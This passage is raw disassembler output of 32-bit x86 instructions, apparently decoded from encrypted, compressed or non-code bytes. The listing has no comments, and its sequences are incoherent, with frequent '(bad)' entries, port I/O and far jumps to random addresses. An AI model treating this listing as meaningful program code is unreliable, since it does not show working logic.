  40a882:	loopne 0x40a87d
  40a884:	push   edi
  40a885:	int3   
  40a886:	cmp    al,0xc6
  40a888:	pop    ecx
  40a889:	or     al,0xd5
  40a88b:	sar    DWORD PTR [eax-0xe],cl
  40a88e:	xlat   BYTE PTR ds:[ebx]
  40a88f:	in     al,0x4e
  40a891:	and    al,0xf3
  40a893:	icebp  
  40a894:	fdivr  st,st(0)
  40a896:	push   0x58
  40a898:	dec    DWORD PTR [ebp+0x138fb072]
  40a89e:	adc    ah,BYTE PTR ds:0xfd7fa18e
  40a8a4:	push   ebx
  40a8a5:	and    al,0xbe
  40a8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a8:	jno    0x40a8b1
  40a8aa:	popf   
  40a8ab:	pop    edi
  40a8ac:	push   ss
  40a8ad:	inc    edx
  40a8ae:	(bad)  
  40a8af:	mov    ecx,0xb286cfbd
  40a8b4:	out    dx,eax
  40a8b5:	inc    edx
  40a8b6:	jbe    0x40a876
  40a8b8:	jno    0x40a90f
  40a8ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8bb:	hlt    
  40a8bc:	icebp  
  40a8bd:	addr16 repz xchg ebp,eax
  40a8c0:	add    BYTE PTR [edx+edx*8],0xdd
  40a8c4:	dec    ecx
  40a8c5:	call   0x87b3b720
  40a8ca:	arpl   WORD PTR [ebx],bx
  40a8cc:	test   al,0x4c
  40a8ce:	xor    BYTE PTR [edi+0x253f8f5e],0x65
  40a8d5:	pop    ss
  40a8d6:	ffree  st(4)
  40a8d8:	jmp    0x3e15:0x73fd6808
  40a8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8e0:	into   
  40a8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e2:	push   edx
  40a8e3:	sbb    BYTE PTR [edi+0x111af922],cl
  40a8e9:	cdq    
  40a8ea:	mov    dl,0x4b
  40a8ec:	test   DWORD PTR [edi],0x4755a1c6
  40a8f2:	mov    edi,0x777b53d8
  40a8f7:	mov    eax,ds:0x9a576dd9
  40a8fc:	test   eax,0xa2dca509
  40a901:	mov    BYTE PTR [ebx],bh
  40a903:	sti    
  40a904:	sbb    BYTE PTR [ebx+0x8],ah
  40a907:	stos   DWORD PTR es:[edi],eax
  40a908:	leave  
  40a909:	jbe    0x40a8e2
  40a90b:	sbb    ch,BYTE PTR [eax]
  40a90d:	inc    esi
  40a90e:	cmp    eax,0x974ee937
  40a913:	mov    al,0xa0
  40a915:	push   ebx
  40a916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a917:	xchg   ecx,eax
  40a918:	jecxz  0x40a8e0
  40a91a:	or     ah,BYTE PTR [esi]
  40a91c:	sub    eax,0xee46f567
  40a921:	(bad)  
  40a922:	stos   DWORD PTR es:[edi],eax
  40a923:	fcomip st,st(1)
  40a925:	jno    0x40a908
  40a927:	pop    DWORD PTR [esi-0x67]
  40a92a:	sbb    BYTE PTR [edi-0x5d2a664f],cl
  40a930:	in     al,0x95
  40a932:	sbb    eax,edi
  40a934:	test   edx,ebp
  40a936:	mov    ?,WORD PTR [esi-0x4]
  40a939:	pcmpgtw mm4,QWORD PTR [ebx+esi*1+0x15]
  40a93e:	cmc    
  40a93f:	mov    ds:0xe30a58d8,eax
  40a944:	mov    ecx,0x38f3dae3
  40a949:	jl     0x40a9c8
  40a94b:	push   0x27
  40a94d:	xor    eax,0xb7ce062a
  40a952:	ds iret 
  40a954:	popa   
  40a955:	push   ds
  40a956:	lods   al,BYTE PTR ds:[esi]
  40a957:	es in  al,dx
  40a959:	call   0xf8c5:0x18d71f2e
  40a960:	enter  0x2623,0x6b
  40a964:	daa    
  40a965:	imul   edi,ebp,0xffffffc7
  40a968:	jg     0x40a9e6
  40a96a:	jecxz  0x40a966
  40a96c:	stos   BYTE PTR es:[edi],al
  40a96d:	pop    ds
  40a96e:	loopne 0x40a927
  40a970:	shl    BYTE PTR [ecx-0x25d41fea],1
  40a976:	xchg   esp,eax
  40a977:	mov    esp,0x64294fe0
  40a97c:	cmp    bh,BYTE PTR [edi-0x7e58431d]
  40a982:	push   edi
  40a983:	test   DWORD PTR [ecx+edx*8-0xb],ecx
  40a987:	popf   
  40a988:	pop    esi
  40a989:	mov    BYTE PTR [ebp+0x7b],0x3a
  40a98d:	rcl    DWORD PTR [esi+0x6c84a495],1
  40a993:	jb     0x40a9f3
  40a995:	push   esp
  40a996:	xor    DWORD PTR [edx],ebx
  40a998:	cmc    
  40a999:	pop    ss
  40a99a:	xchg   edi,eax
  40a99b:	mov    bh,0x2a
  40a99d:	retf   
  40a99e:	fs push cs
  40a9a0:	or     eax,0x372c438
  40a9a5:	cmp    edx,edx
  40a9a7:	out    0xd7,al
  40a9a9:	xchg   edx,eax
  40a9aa:	xor    eax,0x89702b87
  40a9af:	les    edi,FWORD PTR [edx+edx*4-0x6d]
  40a9b3:	jne    0x40a970
  40a9b5:	cmp    eax,0x81882170
  40a9ba:	mov    eax,ds:0xdc900e95
  40a9bf:	jp     0x40aa39
  40a9c1:	push   0x3f
  40a9c3:	cmp    eax,0x239d4713
  40a9c8:	jb     0x40a997
  40a9ca:	and    eax,0x905c85a0
  40a9cf:	jbe    0x40aa3c
  40a9d1:	mov    eax,ds:0x8082a078
  40a9d6:	call   0x44d0:0x77c312de
  40a9dd:	dec    edx
  40a9de:	xchg   edi,eax
  40a9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e0:	stos   BYTE PTR es:[edi],al
  40a9e1:	dec    ecx
  40a9e2:	xchg   ecx,eax
  40a9e3:	jmp    0xbe83b10d
  40a9e8:	clc    
  40a9e9:	mov    DWORD PTR [ebp+0x43],esp
  40a9ec:	data16 fcmovnu st,st(0)
  40a9ef:	cmp    eax,0xbb68000f
  40a9f4:	(bad)  
  40a9f5:	dec    ebx
  40a9f6:	push   esi
  40a9f7:	xlat   BYTE PTR ds:[ebx]
  40a9f8:	inc    edx
  40a9f9:	lahf   
  40a9fa:	push   ecx
  40a9fb:	fbld   TBYTE PTR [ebx+edx*4+0x5c7e0328]
  40aa02:	and    edx,esp
  40aa04:	add    BYTE PTR ss:[edi+0x7323ee9c],dl
  40aa0b:	or     ch,BYTE PTR [ebp+0x2f035d57]
  40aa11:	pushf  
  40aa12:	xchg   esp,eax
  40aa13:	lea    edi,[edx]
  40aa15:	sti    
  40aa16:	push   ds
  40aa17:	mov    ebp,0xfaab34f8
  40aa1c:	mov    esi,0x53196d2b
  40aa21:	out    0x8a,eax
  40aa23:	call   0x96ba:0x2bedc351
  40aa2a:	aas    
  40aa2b:	xor    DWORD PTR [edx+0x24],ebp
  40aa2e:	jmp    0x40a9e9
  40aa30:	adc    dh,bh
  40aa32:	adc    edi,DWORD PTR [eax+ebp*1-0x66]
  40aa36:	out    dx,al
  40aa37:	jmp    0x40aa8b
  40aa39:	xchg   DWORD PTR [edi+0x1],esp
  40aa3c:	lds    edx,FWORD PTR [edx]
  40aa3e:	cmp    eax,0x1cdf6d9
  40aa43:	js     0x40aa4b
  40aa45:	inc    esi
  40aa46:	push   0xffffffa2
  40aa48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa49:	xor    DWORD PTR [edi+0x4006d17b],edi
  40aa4f:	mov    WORD PTR [edx-0x482b408a],cs
  40aa55:	xchg   esi,eax
  40aa56:	xchg   edx,eax
  40aa57:	int3   
  40aa58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa59:	bound  esi,QWORD PTR [edx]
  40aa5b:	lods   eax,DWORD PTR ds:[esi]
  40aa5c:	into   
  40aa5d:	xchg   esp,eax
  40aa5e:	mov    bh,0xaa
  40aa60:	enter  0xc8c7,0xc1
  40aa64:	popa   
  40aa65:	cdq    
  40aa66:	retf   
  40aa67:	mov    bh,BYTE PTR [esi+edi*4+0x15]
  40aa6b:	jbe    0x40aac2
  40aa6d:	jnp    0x40aaea
  40aa6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa70:	jmp    0x40aa64
  40aa72:	pop    es
  40aa73:	jno    0x40aa50
  40aa75:	(bad)  
  40aa76:	shl    BYTE PTR [edx+0x5539b33f],cl
  40aa7c:	stos   DWORD PTR es:[edi],eax
  40aa7d:	sti    
  40aa7e:	cmp    DWORD PTR [ebp+0x78],eax
  40aa81:	in     eax,dx
  40aa82:	enter  0x933f,0x12
  40aa86:	dec    ebx
  40aa87:	jle    0x40aac5
  40aa89:	stos   BYTE PTR es:[edi],al
  40aa8a:	sbb    dl,BYTE PTR ds:0x8e89e6db
  40aa90:	cmp    DWORD PTR [esi-0x409c2cde],ecx
  40aa96:	dec    ebx
  40aa97:	fs pop edx
  40aa99:	nop
  40aa9a:	sub    edx,DWORD PTR [ebx-0x6cb668e1]
  40aaa0:	dec    edx
  40aaa1:	shl    DWORD PTR [edi+eax*2],cl
  40aaa4:	mov    eax,ds:0x11add6b5
  40aaa9:	ror    BYTE PTR [esi],0x64
  40aaac:	jo     0x40aac1
  40aaae:	nop
  40aaaf:	mov    esi,0x331b80c1
  40aab4:	push   ds
  40aab5:	imul   WORD PTR ds:0xd3ec2a6
  40aabc:	in     eax,0x3d
  40aabe:	arpl   si,bp
  40aac0:	out    0x52,eax
  40aac2:	mov    al,ds:0xd616ff30
  40aac7:	dec    DWORD PTR [ebp*8-0x4fd8aed]
  40aace:	nop
  40aacf:	push   esi
  40aad0:	dec    edx
  40aad1:	fldcw  WORD PTR [esi]
  40aad3:	push   ecx
  40aad4:	cmp    BYTE PTR [ebx-0x538dc4bd],bl
  40aada:	jo     0x40aa79
  40aadc:	mov    ecx,0xff102379
  40aae1:	pop    edi
  40aae2:	das    
  40aae3:	pusha  
  40aae4:	cmp    ecx,ebx
  40aae6:	adc    al,0x3b
  40aae8:	jp     0x40aace
  40aaea:	push   esi
  40aaeb:	pop    eax
  40aaec:	adc    dl,bl
  40aaee:	add    DWORD PTR [eiz*4+0x7d53b78a],ebx
  40aaf5:	dec    ebp
  40aaf6:	mov    edx,0xabb06381
  40aafb:	xor    ebp,DWORD PTR [edx]
  40aafd:	push   0xa
  40aaff:	sub    al,0x2
  40ab01:	ins    DWORD PTR es:[edi],dx
  40ab02:	jg     0x40aa8b
  40ab04:	push   edx
  40ab05:	rep lods eax,DWORD PTR ds:[esi]
  40ab07:	test   al,0x7f
  40ab09:	ret    
  40ab0a:	mov    dh,0x4f
  40ab0c:	aas    
  40ab0d:	cmp    al,0xea
  40ab0f:	retf   0x8f50
  40ab12:	(bad)  
  40ab13:	loop   0x40ab12
  40ab15:	js     0x40aad9
  40ab17:	loope  0x40ab11
  40ab19:	or     BYTE PTR [ecx+eiz*4-0x11],ah
  40ab1d:	xor    al,0x3a
  40ab1f:	mov    al,ds:0x7a875c6
  40ab24:	outs   dx,DWORD PTR ds:[esi]
  40ab25:	out    dx,al
  40ab26:	cmp    al,0xdc
  40ab28:	retf   0xcb91
  40ab2b:	xor    BYTE PTR [ebx-0x8],ah
  40ab2e:	mov    ecx,0x8cfc132
  40ab33:	stc    
  40ab34:	retf   0xcd22
  40ab37:	es mov edi,0xcab2c8ec
  40ab3d:	out    dx,eax
  40ab3e:	jae    0x40aaea
  40ab40:	pop    edx
  40ab41:	(bad)  
  40ab42:	not    DWORD PTR [ebp+0x7b]
  40ab45:	cmp    eax,0x105e7b6
  40ab4a:	xor    eax,DWORD PTR [eax+eiz*2+0x2478ef9b]
  40ab51:	dec    ecx
  40ab52:	sbb    BYTE PTR [ecx+0x6fca582b],dl
  40ab58:	sbb    bh,BYTE PTR [edi+0x14dfa33]
  40ab5e:	dec    esi
  40ab5f:	(bad)  
  40ab60:	fld    DWORD PTR [ecx-0x54c90378]
  40ab66:	mov    ch,0xa6
  40ab68:	mov    BYTE PTR [ebp+0xe1e5eb],dl
  40ab6e:	test   al,0xca
  40ab70:	mov    ebp,0x67038bda
  40ab75:	mov    ds:0x781a832a,eax
  40ab7a:	mov    dl,0x4f
  40ab7c:	inc    ebp
  40ab7d:	push   esi
  40ab7e:	inc    ebx
  40ab7f:	dec    esi
  40ab80:	adc    esi,edx
  40ab82:	mov    dl,0xfb
  40ab84:	xchg   edx,eax
  40ab85:	jecxz  0x40abec
  40ab87:	dec    edx
  40ab88:	fst    DWORD PTR [edi+0x4f]
  40ab8b:	dec    ebx
  40ab8c:	pop    esp
  40ab8d:	jns    0x40ab21
  40ab8f:	push   edx
  40ab90:	mov    ebp,0x10794f32
  40ab95:	cmp    cl,BYTE PTR gs:[edx]
  40ab98:	mov    al,0xcd
  40ab9a:	sbb    ebx,DWORD PTR [ebp-0x75]
  40ab9d:	lods   ax,WORD PTR ds:[esi]
  40ab9f:	mov    edi,0xe29bec7b
  40aba4:	adc    DWORD PTR [eax+eax*1-0x6fd88f4c],ecx
  40abab:	test   eax,0xb8c7d49
  40abb0:	ds or  eax,0x9406e014
  40abb6:	dec    ebx
  40abb7:	pop    ecx
  40abb8:	dec    esp
  40abb9:	mov    eax,ds:0x9b031ad2
  40abbe:	xchg   ecx,eax
  40abbf:	sbb    dl,ah
  40abc1:	mov    eax,ds:0x40c7633c
  40abc6:	jg     0x40ac07
  40abc8:	pop    ebx
  40abc9:	out    dx,eax
  40abca:	and    eax,0x96a42fa0
  40abcf:	cld    
  40abd0:	xchg   ebx,eax
  40abd1:	inc    ecx
  40abd2:	push   es
  40abd3:	fwait
  40abd4:	mov    eax,ds:0xee32c8ba
  40abd9:	shl    bl,0xd0
  40abdc:	and    BYTE PTR [ebx-0x10],bh
  40abdf:	jecxz  0x40abe1
  40abe1:	int    0x26
  40abe3:	push   ebx
  40abe4:	aas    
  40abe5:	ins    DWORD PTR es:[edi],dx
  40abe6:	fistp  QWORD PTR [ecx-0x1a3c79f8]
  40abec:	je     0x40abc2
  40abee:	inc    esi
  40abef:	pop    esp
  40abf0:	pop    es
  40abf1:	leave  
  40abf2:	imul   edx,esp,0xff5ff2aa
  40abf8:	xchg   ebx,eax
  40abf9:	xor    bl,0x14
  40abfc:	add    DWORD PTR [ebp-0x32c710e2],ecx
  40ac02:	pop    es
  40ac03:	push   es
  40ac04:	loop   0x40ab99
  40ac06:	mov    edx,0x5d08ffda
  40ac0b:	retf   
  40ac0c:	daa    
  40ac0d:	clc    
  40ac0e:	inc    edi
  40ac0f:	and    eax,0xd1e406c4
  40ac14:	xor    DWORD PTR [ebx],eax
  40ac16:	mov    dh,0xec
  40ac18:	add    BYTE PTR [eax-0x7c942c69],bl
  40ac1e:	out    dx,eax
  40ac1f:	aas    
  40ac20:	es cdq 
  40ac22:	mov    edx,0x5766f013
  40ac27:	push   esp
  40ac28:	sar    BYTE PTR cs:[ecx],1
  40ac2b:	fcom   QWORD PTR [edi+ebx*1-0x2b]
  40ac2f:	push   cs
  40ac30:	mul    BYTE PTR [eax+0x2b]
  40ac33:	test   DWORD PTR [edx+0x41],esi
  40ac36:	scas   al,BYTE PTR es:[edi]
  40ac37:	mov    edx,0xcb0ab843
  40ac3c:	jbe    0x40abf7
  40ac3e:	xchg   BYTE PTR [edi-0x8578734],bl
  40ac44:	pop    ebx
  40ac45:	cld    
  40ac46:	dec    ecx
  40ac47:	jno    0x40ac82
  40ac49:	test   ah,dl
  40ac4b:	or     ebp,DWORD PTR [esi]
  40ac4d:	test   dh,cl
  40ac4f:	sub    eax,0x9c459130
  40ac54:	sub    al,0x3b
  40ac56:	dec    esp
  40ac57:	aad    0xea
  40ac59:	add    edi,DWORD PTR [edx+edi*8+0x17]
  40ac5d:	push   esi
  40ac5e:	inc    eax
  40ac5f:	mov    DWORD PTR [ebx-0x98cdf89],edi
  40ac65:	addr16 jg 0x40ac96
  40ac68:	cmp    ebx,esp
  40ac6a:	mov    al,ds:0x9a2bbbcc
  40ac6f:	in     eax,dx
  40ac70:	pop    edx
  40ac71:	sets   cl
  40ac74:	daa    
  40ac75:	lods   eax,DWORD PTR ds:[esi]
  40ac76:	bound  edx,QWORD PTR [eax+ebp*1+0x4910b2a]
  40ac7d:	sti    
  40ac7e:	sbb    eax,0x7a8bcbe5
  40ac83:	cmp    cl,al
  40ac85:	xor    BYTE PTR [edx],al
  40ac87:	jmp    0x40ac82
  40ac89:	inc    ebp
  40ac8a:	dec    esp
  40ac8b:	mov    eax,ds:0x4dc5561d
  40ac90:	imul   edx,DWORD PTR [ecx],0x9a4531ea
  40ac96:	dec    edx
  40ac97:	or     eax,0xc98f94de
  40ac9c:	xor    BYTE PTR [edi+0x1a],dh
  40ac9f:	mov    dh,0x12
  40aca1:	adc    al,0x4d
  40aca3:	mov    eax,ds:0xe22ac461
  40aca8:	ds retf 0xc57a
  40acac:	push   edi
  40acad:	dec    edi
  40acae:	cs (bad) 
  40acb0:	xor    edi,DWORD PTR [ebx+eiz*4-0xbad386d]
  40acb7:	mov    DWORD PTR [edi],esp
  40acb9:	mov    eax,0x4da5b2f2
  40acbe:	ret    
  40acbf:	fsub   st,st(4)
  40acc1:	add    DWORD PTR ds:0xcee1763c,edx
  40acc7:	mov    ?,eax
  40acc9:	stos   DWORD PTR es:[edi],eax
  40acca:	ins    DWORD PTR es:[edi],dx
  40accb:	mov    ds:0xa8fc2da8,al
  40acd0:	shr    DWORD PTR [ebp+0x17],0xdc
  40acd4:	pop    es
  40acd5:	shl    BYTE PTR [edi+0xfbafe6c],cl
  40acdb:	pop    eax
  40acdc:	das    
  40acdd:	mov    es,WORD PTR [eax+0x19]
  40ace0:	jl     0x40ac8b
  40ace2:	sub    al,bh
  40ace4:	nop
  40ace5:	cli    
  40ace6:	mov    esi,0x4dcc943e
  40aceb:	xor    DWORD PTR [edx+0x54],esp
  40acee:	sar    ch,0x2
  40acf1:	int    0xe2
  40acf3:	adc    edi,edx
  40acf5:	cld    
  40acf6:	sub    DWORD PTR [esi+0x19252a2a],edi
  40acfc:	xor    eax,0x72af201a
  40ad01:	xor    dl,BYTE PTR [edi-0x55]
  40ad04:	dec    edi
  40ad05:	rcl    DWORD PTR [ecx-0x69],cl
  40ad08:	in     al,0xf3
  40ad0a:	jae    0x40acbd
  40ad0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad0d:	sahf   
  40ad0e:	jmp    0x7ff9:0xd1adfee8
  40ad15:	data16 scas al,BYTE PTR es:[edi]
  40ad17:	leave  
  40ad18:	out    dx,al
  40ad19:	inc    esp
  40ad1a:	repz mov al,ds:0x708dfb71
  40ad20:	mov    bh,0x1e
  40ad22:	loopne 0x40ad0f
  40ad24:	xor    bl,dl
  40ad26:	sub    DWORD PTR [ebx+eiz*8+0x31f90beb],edi
  40ad2d:	sub    cl,bl
  40ad2f:	inc    edx
  40ad30:	in     al,dx
  40ad31:	mov    ss,WORD PTR [esp+esi*4+0xcc093c8]
  40ad38:	repnz mov esi,0x82e6832d
  40ad3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad3f:	stc    
  40ad40:	push   ebp
  40ad41:	dec    eax
  40ad42:	das    
  40ad43:	dec    edx
  40ad44:	fist   WORD PTR [esi]
  40ad46:	in     eax,0x8e
  40ad48:	(bad)  
  40ad4a:	enter  0x2bb4,0x4f
  40ad4e:	sub    cl,BYTE PTR [edx-0x65]
  40ad51:	cdq    
  40ad52:	je     0x40adcf
  40ad54:	sti    
  40ad55:	repz add eax,0xe1d60f4f
  40ad5b:	xor    BYTE PTR [edx+0x1e],dh
  40ad5e:	adc    DWORD PTR [edx+0x39],0xffffffde
  40ad62:	mov    eax,0xc99585e4
  40ad67:	jp     0x40ad67
  40ad69:	push   ss
  40ad6a:	shl    DWORD PTR ds:0x9041aae2,0x71
  40ad71:	aad    0x90
  40ad73:	lock inc eax
  40ad75:	sbb    al,BYTE PTR [ebp+0x6f]
  40ad78:	in     al,dx
  40ad79:	ins    DWORD PTR es:[edi],dx
  40ad7a:	xchg   esp,eax
  40ad7b:	push   ds
  40ad7c:	xor    al,0x7f
  40ad7e:	dec    ebx
  40ad7f:	test   al,0x62
  40ad81:	xchg   ebx,eax
  40ad82:	or     DWORD PTR [eax-0x500c7ae0],esi
  40ad88:	hlt    
  40ad89:	ret    
  40ad8a:	das    
  40ad8b:	jnp    0x40ad29
  40ad8d:	dec    ebp
  40ad8e:	leave  
  40ad8f:	fisub  DWORD PTR [edi-0x222eae79]
  40ad95:	add    ah,al
  40ad97:	fisub  DWORD PTR [eax]
  40ad99:	in     eax,dx
  40ad9a:	inc    esi
  40ad9b:	loopne 0x40ad97
  40ad9d:	inc    ebp
  40ad9e:	inc    ebx
  40ad9f:	and    esi,ebx
  40ada1:	jnp    0x40add5
  40ada3:	into   
  40ada4:	jnp    0x40add2
  40ada6:	mov    al,ds:0xcefba711
  40adab:	mov    ch,0x75
  40adad:	out    dx,eax
  40adae:	sub    BYTE PTR [ebp+ebx*4-0x6d],ah
  40adb2:	out    0xb6,al
  40adb4:	xchg   esi,eax
  40adb5:	add    al,0x3f
  40adb7:	sti    
  40adb8:	fbld   TBYTE PTR [eax+eiz*2]
  40adbb:	dec    edi
  40adbc:	pop    esi
  40adbd:	lds    edx,FWORD PTR [eax-0x45]
  40adc0:	jmp    0x19:0x6ccc31ed
  40adc7:	stos   DWORD PTR es:[edi],eax
  40adc8:	fiadd  WORD PTR [ebx+0x0]
  40adcb:	and    ah,dl
  40adcd:	retf   0x91df
  40add0:	mov    bl,0x6f
  40add2:	je     0x40add0
  40add4:	lods   eax,DWORD PTR ds:[esi]
  40add5:	sub    al,0x87
  40add7:	mov    eax,ds:0x36e575fc
  40addc:	cmp    eax,0xf9abc76b
  40ade1:	test   bl,cl
  40ade3:	shl    BYTE PTR [eax+ecx*1-0x1b],0xe9
  40ade8:	adc    esi,ecx
  40adea:	push   eax
  40adeb:	into   
  40adec:	imul   ebx,DWORD PTR [eax-0x47],0xffffffec
  40adf0:	push   ss
  40adf1:	fs ja  0x40adc2
  40adf4:	imul   esp,DWORD PTR [eax],0xffffff86
  40adf7:	mov    bh,0xd3
  40adf9:	cmp    eax,DWORD PTR [ebp-0x68a0b8c9]
  40adff:	mov    WORD PTR [ecx+esi*4],ss
  40ae02:	popa   
  40ae03:	jmp    0xfd5:0x8694cce7
  40ae0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae0b:	cs mov bh,0x42
  40ae0e:	in     eax,0x66
  40ae10:	loopne 0x40adee
  40ae12:	fwait
  40ae13:	cli    
  40ae14:	add    DWORD PTR [ebx],ebx
  40ae16:	dec    ecx
  40ae17:	das    
  40ae18:	inc    eax
  40ae19:	icebp  
  40ae1a:	shl    DWORD PTR [ebp-0x25],0xbf
  40ae1e:	loop   0x40ae9d
  40ae20:	test   BYTE PTR [ecx+0x1d],dl
  40ae23:	popf   
  40ae24:	mov    edx,0xfca6de4f
  40ae29:	nop
  40ae2a:	js     0x40ae45
  40ae2c:	scas   eax,DWORD PTR es:[edi]
  40ae2d:	aas    
  40ae2e:	or     DWORD PTR [edi-0x1f],esi
  40ae31:	push   cs
  40ae32:	icebp  
  40ae33:	jecxz  0x40ae5d
  40ae35:	cmp    ebx,DWORD PTR ds:0xb3ae92f8
  40ae3b:	in     al,dx
  40ae3c:	stos   DWORD PTR es:[edi],eax
  40ae3d:	adc    ebx,edx
  40ae3f:	iret   
  40ae40:	scas   eax,DWORD PTR es:[edi]
  40ae41:	sti    
  40ae42:	sub    ebx,edi
  40ae44:	lea    ebx,[eax-0x1d87e473]
  40ae4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4b:	ror    DWORD PTR [ebx+0x10],cl
  40ae4e:	pushf  
  40ae4f:	mov    edi,DWORD PTR [eax-0xe27274b]
  40ae55:	jecxz  0x40adeb
  40ae57:	and    ah,BYTE PTR [ebx-0x37]
  40ae5a:	test   BYTE PTR [ebx+eax*1+0x26],bh
  40ae5e:	loop   0x40aedc
  40ae60:	xchg   edx,eax
  40ae61:	in     al,dx
  40ae62:	cmp    eax,0x4ec5217a
  40ae67:	jmp    0x40aed9
  40ae69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae6a:	mov    eax,ds:0x7f9ad44a
  40ae6f:	cli    
  40ae70:	xchg   BYTE PTR [ebx],al
  40ae72:	xor    eax,ecx
  40ae74:	mov    bh,0x52
  40ae76:	adc    BYTE PTR [eax],0x7a
  40ae79:	xlat   BYTE PTR ds:[ebx]
  40ae7a:	inc    esp
  40ae7b:	lods   al,BYTE PTR gs:[esi]
  40ae7d:	shr    DWORD PTR [eax-0x34359d53],1
  40ae83:	outs   dx,DWORD PTR ds:[esi]
  40ae84:	dec    esi
  40ae85:	push   ss
  40ae86:	mov    cs,esp
  40ae88:	shl    BYTE PTR [edi],cl
  40ae8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae8b:	or     cl,cl
  40ae8d:	or     eax,0x89bf3a08
  40ae92:	add    eax,0xc73997e0
  40ae97:	test   BYTE PTR [edx],dl
  40ae99:	mov    esp,0x3341c2a7
  40ae9e:	sbb    DWORD PTR [edx-0x2b9cc52a],esi
  40aea4:	xchg   edi,eax
  40aea5:	pop    eax
  40aea6:	outs   dx,BYTE PTR ds:[esi]
  40aea7:	push   edx
  40aea8:	jmp    0x4768:0x74b6c09d
  40aeaf:	mov    esi,0xec8767bd
  40aeb4:	aas    
  40aeb5:	icebp  
  40aeb6:	mov    ds:0x3b87ecb,eax
  40aebb:	jns    0x40ae43
  40aebd:	aad    0x20
  40aebf:	xlat   BYTE PTR ds:[ebx]
  40aec0:	clc    
  40aec1:	(bad)  
  40aec2:	xor    eax,DWORD PTR [edi+eiz*1]
  40aec5:	mov    eax,ds:0x15ebb390
  40aeca:	sub    BYTE PTR [ecx-0x42f4cbf9],bl
  40aed0:	repnz leave 
  40aed2:	or     ecx,DWORD PTR [edx+0x6b]
  40aed5:	inc    esi
  40aed6:	xchg   ecx,eax
  40aed7:	jl     0x40ae85
  40aed9:	mov    bh,0xc6
  40aedb:	ss pop es
  40aedd:	inc    ecx
  40aede:	cwde   
  40aedf:	adc    ebp,eax
  40aee1:	call   0x12626780
  40aee6:	mov    dl,0xbd
  40aee8:	call   DWORD PTR [edx+eiz*4]
  40aeeb:	aad    0xa8
  40aeed:	jge    0x40aecf
  40aeef:	cmp    edi,esp
  40aef1:	int3   
  40aef2:	push   0xffffffee
  40aef4:	sub    bh,dl
  40aef6:	mov    dh,0xfb
  40aef8:	es adc al,0x38
  40aefb:	js     0x40af00
  40aefd:	jmp    0xe434:0xc58e08e7
  40af04:	mov    al,0x97
  40af06:	aad    0x8c
  40af08:	jmp    0x42d8:0x301a1288
  40af0f:	rcr    DWORD PTR [ebx-0x29040563],cl
  40af15:	and    eax,0x37244df2
  40af1a:	mov    ebx,0x1710594
  40af1f:	dec    edi
  40af20:	mov    bh,dh
  40af22:	push   ecx
  40af23:	and    ah,BYTE PTR [edi]
  40af25:	jae    0x40af15
  40af27:	scas   eax,DWORD PTR es:[edi]
  40af28:	retf   
  40af29:	pop    edi
  40af2a:	je     0x40af69
  40af2c:	pop    eax
  40af2d:	or     esi,eax
  40af2f:	(bad)
  40af33:	and    eax,0xf42a52f5
  40af38:	call   0x91e8c72b
  40af3d:	xor    BYTE PTR [ecx+eax*4-0x9b7daac],bh
  40af44:	ret    
  40af45:	push   0x1528f9d6
  40af4a:	shr    dh,1
  40af4c:	adc    ebp,DWORD PTR ds:0x3baabef1
  40af52:	xchg   edx,eax
  40af53:	lahf   
  40af54:	daa    
  40af55:	inc    ebp
  40af56:	stos   BYTE PTR es:[edi],al
  40af57:	mov    ebx,0xe7e40026
  40af5c:	retf   
  40af5d:	and    BYTE PTR [esi-0xd313ae4],dl
  40af63:	lock outs dx,DWORD PTR ds:[esi]
  40af65:	inc    ebx
  40af66:	push   ecx
  40af67:	pushf  
  40af68:	in     al,dx
  40af69:	jecxz  0x40afd1
  40af6b:	ret    0x965
  40af6e:	out    0xa9,al
  40af70:	add    cl,BYTE PTR [ebx+0x63735ca]
  40af76:	(bad)  
  40af77:	mul    BYTE PTR [ebp-0x158b09eb]
  40af7d:	data16 aad 0xec
  40af80:	ja     0x40af74
  40af82:	daa    
  40af83:	imul   DWORD PTR [eax+0x70c5d24e]
  40af89:	cmc    
  40af8a:	mov    dl,0x4e
  40af8c:	push   ds
  40af8d:	xchg   edi,eax
  40af8e:	in     eax,0x9e
  40af90:	xor    al,BYTE PTR [esi]
  40af92:	fs jmp 0xb731f255
  40af98:	push   edx
  40af99:	aam    0x70
  40af9b:	out    dx,al
  40af9c:	aad    0x67
  40af9e:	(bad)  
  40af9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa0:	and    al,0x58
  40afa2:	or     al,0x93
  40afa4:	or     ah,BYTE PTR [ebx]
  40afa6:	int    0xbf
  40afa8:	add    ebp,esi
  40afaa:	bound  ecx,QWORD PTR [esi]
  40afac:	mov    ecx,0x98fb674f
  40afb1:	xchg   esp,eax
  40afb2:	aas    
  40afb3:	iret   
  40afb4:	bound  edx,QWORD PTR [esi]
  40afb6:	jae    0x40af53
  40afb8:	test   al,0xb9
  40afba:	jge    0x40af5f
  40afbc:	cmp    DWORD PTR [ebx-0x48],ebx
  40afbf:	mov    bl,0x1a
  40afc1:	repz or esi,DWORD PTR [eax-0x1105eb5e]
  40afc8:	cld    
  40afc9:	xchg   ecx,eax
  40afca:	push   ecx
  40afcb:	std    
  40afcc:	dec    esi
  40afcd:	add    eax,0x448f115
  40afd2:	add    al,0xda
  40afd4:	lea    edx,[ebp+0x42]
  40afd7:	fucomp st(6)
  40afd9:	ins    DWORD PTR es:[edi],dx
  40afda:	outs   dx,BYTE PTR ds:[esi]
  40afdb:	stos   BYTE PTR es:[edi],al
